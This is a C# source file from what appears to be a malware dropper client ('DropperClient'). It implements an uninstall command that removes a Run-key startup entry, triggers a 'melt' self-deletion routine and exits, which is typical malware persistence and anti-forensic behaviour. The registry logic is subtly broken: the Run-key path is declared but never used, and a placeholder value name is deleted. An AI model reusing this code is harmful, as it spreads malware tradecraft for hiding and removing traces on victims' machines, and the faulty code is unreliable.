using System;
using DropperClient.Installation;
using Microsoft.Win32;

namespace DropperClient.Command
{
    internal class UninstallCommand : ICommand
    {
        /// <summary>
        /// Tries to remove itself from registry startup and then delete the .exe
        /// </summary>
        /// <returns></returns>
        public bool Execute()
        {
            var execInfo = new ExecutableInfo();

            string keyName = @"Software\Microsoft\Windows\CurrentVersion\Run";
            using (RegistryKey key = Registry.CurrentUser.OpenSubKey(execInfo.AssemblyName, true))
            {
                if (key == null)
                {
                    // Key doesn't exist. Do whatever you want to handle
                    // this case
                }
                else
                {
                    key.DeleteValue("MyApp");
                }
            }

            execInfo.StartMelt();
            Environment.Exit(0);

            return true;
        }
    }
}